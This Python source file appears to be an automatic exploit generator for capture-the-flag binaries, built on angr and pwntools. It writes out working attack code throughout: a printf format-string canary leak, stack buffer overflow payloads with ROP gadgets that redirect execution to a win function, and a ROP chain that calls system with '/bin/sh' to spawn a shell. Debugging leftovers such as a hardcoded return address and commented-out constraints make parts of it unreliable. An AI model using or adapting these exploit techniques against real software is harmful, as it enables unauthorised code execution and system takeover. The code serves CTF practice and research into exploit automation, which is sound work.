import angr
import claripy
import os.path
from dataclasses import dataclass
from goals import Goal, SystemFunction, WinFunction
from pwn import p64, process, ROP, context, gdb
from vulns import (
    Vulnerability,
    StackBufferOverflow,
    WinFunctionCall,
    UnconstrainedPrintf,
    BufferWrite,
)
from binary import Binary
from typing import Optional
from constants import PROCESS_STDOUT_WAIT_TIMEOUT


@dataclass
class ExploitError(Exception):
    message: str


def exploit(binary: Binary, goals: list[Goal], vulns: list[Vulnerability]) -> bytes:
    if binary.pie:
        raise ExploitError("Cannot exploit binaries with PIE yet")

    canary_payloads = None
    if binary.canary:
        canary_payloads = gen_canary_leak_payload(binary, vulns)
        if len(canary_payloads) == 0:
            raise ExploitError("Failed to defect stack canary")

    for goal in goals:
        print(f"Current goal: {goal}")
        try:
            with context.quiet:
                p = process(
                    os.path.abspath(binary.path), cwd=os.path.dirname(binary.path)
                )

                # Leak stack canary if present
                canary = None
                if binary.canary:
                    p.send(canary_payloads[0])

                    # recvall with a timeout but it doesn't force close the connection
                    with p.local(PROCESS_STDOUT_WAIT_TIMEOUT):
                        try:
                            while True:
                                if not p._fillbuffer():
                                    break
                        except EOFError:
                            pass
                    out = p.buffer.get()

                    # Extract canary.
                    canary = int(out.split(b"0x")[-1].split(b"\n")[0].strip()[:16], 16)
                    print(f"canary = 0x{canary:x}")

                # Compute final payload stage
                payload, style = gen_payload(binary, goal, vulns, canary)
                print(payload)
                
                context.terminal = 'foot'
                gdb.attach(p)

                p.sendline(payload)
                p.interactive()

                if style == "print_flag":
                    out = p.recvall()
                    print(out)
                    p.close()

                    if b"flag" in out:
                        return out
                elif style == "shell":
                    p.interactive()
                else:
                    print(f"Unknown exploit style '{style}'")
                    p.interactive
            print("Exploit didn't print flag. Trying next goal.\n")
        except ExploitError as e:
            raise ExploitError(f"Failed to achieve goal: {e}")

    raise ExploitError("No solvable goals")


def gen_canary_leak_payload(binary: Binary, vulns: list[Vulnerability]) -> list[bytes]:
    res = []
    for vuln in vulns:
        if not isinstance(vuln, UnconstrainedPrintf):
            continue
        res.append(gen_printf_payload(binary, vuln))
    return res


def gen_printf_payload(binary: Binary, vuln: UnconstrainedPrintf) -> bytes:
    rdi = vuln.state.regs.rdi
    format_string = b"%39$p\x00"
    constraint = format_string == vuln.state.memory.load(rdi, len(format_string))
    if not vuln.state.solver.satisfiable(extra_constraints=[constraint]):
        raise ExploitError(f"Failed to constrain printf input to {format_string}")
    vuln.state.solver.add(constraint)
    payload = get_satisfying_input(vuln.state)
    return payload


def gen_payload(
    binary: Binary, goal: Goal, vulns: list[Vulnerability], canary: Optional[int]
) -> tuple[bytes, str]:
    if isinstance(goal, WinFunction):
        return (gen_win_function_payload(binary, goal, vulns, canary), "print_flag")
    if isinstance(goal, SystemFunction):
        return (gen_system_function_payload(binary, goal, vulns), "shell")

    raise ExploitError(f"Cannot generate payload for {goal}")


def gen_win_function_payload(
    binary: Binary, goal: WinFunction, vulns: list[Vulnerability], canary: Optional[int]
) -> bytes:
    for vuln in reversed(vulns):
        if isinstance(vuln, StackBufferOverflow):
            try:
                return gen_stack_buffer_overflow_payload(binary, vuln, goal, canary)
            except ExploitError as e:
                print(e)
                continue
        elif isinstance(vuln, WinFunctionCall):
            return get_satisfying_input(vuln.state)

    raise ExploitError(
        "Payload generation requires a StackBufferOverflow or WinFunctionCall vulnerability"
    )


def gen_stack_buffer_overflow_payload(
    binary: Binary, vuln: StackBufferOverflow, goal: WinFunction, canary: Optional[int]
) -> bytes:
    rop = ROP(binary.elf)
    gadget = rop.find_gadget(["ret"])
    reach_input = vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size)
    if reach_input.size() > 0:
        reach_input = claripy.Concat(reach_input, claripy.BVV(ord("\n"), 8))
    print(reach_input)
    payload = reach_input
    if binary.canary:
        assert canary is not None
        payload = claripy.Concat(
            claripy.BVS("padding", 8 * vuln.saved_rip_offset - 16),
            claripy.BVV(canary, 64),
            claripy.BVS("padding2", 8),
            claripy.BVV(gadget.address, 64),
            claripy.BVV(goal.addr, 64),
        )
        relevant_offset = reach_input.size()//8 + vuln.saved_rip_offset - 2
    else:
        payload = claripy.Concat(
            claripy.BVS("padding", 8 * vuln.saved_rip_offset),
            claripy.BVV(gadget.address, 64),
            claripy.BVV(goal.addr, 64),
        )
        relevant_offset = reach_input.size()//8 + vuln.saved_rip_offset

    # payload = claripy.BVS("padding", 8 * vuln.saved_rip_offset)

    class Printf(angr.SimProcedure):
        def run(self, format: str):
            return

    binary.angr.hook_symbol("printf", Printf())

    print(
        vuln.state.solver.eval(
            reach_input, cast_to=bytes
        )
    )

    print(vuln.state.posix.stdin)

    simfile = vuln.state.posix.stdin
    simfile.write(vuln.state.posix.stdin.size, payload)

    print(vuln.state.regs.rip)

    # for ret_addr in binary.instruction_locations("ret"):
    for ret_addr in [0x4012a2]:
        # if ret_addr != 0x4012a2:
        # continue

        simgr = binary.angr.factory.simulation_manager(vuln.state.copy())
        simgr.explore(find=ret_addr)

        if len(simgr.found) == 0:
            continue

        found = simgr.found[0]

        constraint = claripy.Extract(payload, payload.size(), relevant_offset * 8) == found.memory.load(vuln.buf_addr, payload.size() // 8 - relevant_offset)
        #if not found.satisfiable(extra_constraints=[constraint]):
            #continue

        #found.solver.add(constraint)

        payload = found.solver.eval(claripy.Concat(reach_input, payload), cast_to=bytes)

        # print(payload)

        # print(
        # found.solver.eval(
        # found.posix.stdin.load(0, found.posix.stdin.size), cast_to=bytes
        # )
        # )

        binary.angr.hook_symbol("printf", angr.SIM_PROCEDURES["libc"]["printf"]())
        if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
            raise ExploitError("Payload exceeds vulnerability max write size")

        # raise ExploitError("A")

        return payload

    binary.angr.hook_symbol("printf", angr.SIM_PROCEDURES["libc"]["printf"]())
    raise ExploitError("Failed to find ret instruction following the buffer overflow")


def get_satisfying_input(state: angr.SimState) -> bytes:
    # Angr leaves off newlines for some reason (I think...)
    return (
        state.solver.eval(
            state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
        )
        + b"\n"
    )


def gen_win_function_call_payload(
    binary: Binary, vuln: WinFunctionCall, goal: Goal
) -> bytes:
    return vuln.state.solver.eval(
        vuln.state.posix.stdin.load(0, vuln.state.posix.stdin.size), cast_to=bytes
    )


def gen_system_function_payload(
    binary: Binary, goal: SystemFunction, vulns: list[Vulnerability]
) -> bytes:
    buffer_write: BufferWrite | None = next(
        (
            vuln
            for vuln in vulns
            if isinstance(vuln, BufferWrite) and vuln.buffer_type == "Global"
        ),
        None,
    )
    if buffer_write is None:
        raise ExploitError("No global buffer to write to")
    if buffer_write.buffer_len is not None and buffer_write.buffer_len < 8:
        raise ExploitError("Buffer too small")

    options = angr.options.unicorn
    options.add(angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY)
    base_state = binary.angr.factory.entry_state(
        add_options=options, stdin=angr.SimFile
    )
    simgr = binary.angr.factory.simulation_manager(base_state)
    simgr.explore(find=buffer_write.instruction_addr)

    write_bin_sh_state = simgr.found[0]
    for vuln in vulns:
        if not isinstance(vuln, StackBufferOverflow):
            continue
        simgr = binary.angr.factory.simulation_manager(write_bin_sh_state.copy())
        simgr.explore(find=buffer_write.instruction_addr)
        for state in simgr.found:
            input = state.solver.eval(
                state.posix.stdin.load(0, state.posix.stdin.size), cast_to=bytes
            )
            if len(input) > 0:
                input += b"\n"

            rop = ROP(binary.elf)

            ret = rop.find_gadget(["ret"]).address
            rop.raw(ret)

            rop.call(goal.addr, [buffer_write.buffer_addr])

            return b"/bin/sh\n" + input + b"A" * vuln.saved_rip_offset + rop.chain()

    raise ExploitError(f"Cannot generate payload for {goal}")
